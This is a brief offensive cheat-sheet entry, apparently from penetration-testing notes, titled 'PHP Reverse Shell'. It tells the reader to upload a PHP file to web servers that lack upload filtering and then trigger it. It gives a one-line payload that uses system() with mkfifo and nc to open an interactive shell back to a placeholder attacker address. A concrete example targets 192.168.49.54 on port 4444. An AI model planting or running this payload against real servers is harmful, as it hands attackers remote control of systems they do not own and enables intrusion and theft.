## PHP Reverse Shell

Usage:

This reverse shell should be uploaded in PHP webservers that allow uploads with no file extension / content type filtering. Then you can attempt to get the webserver to invoke the PHP program by messing around with the webserver e.g. navigating to certain routes, etc.

Replace `${ATTACKER_IP}` and `${ATTACKER_LISTENER_PORT}` below:

```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ATTACKER_IP} ${ATTACKER_LISTENER_PORT} >/tmp/f");?>
```

e.g.

```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.49.54 4444 >/tmp/f");?>
```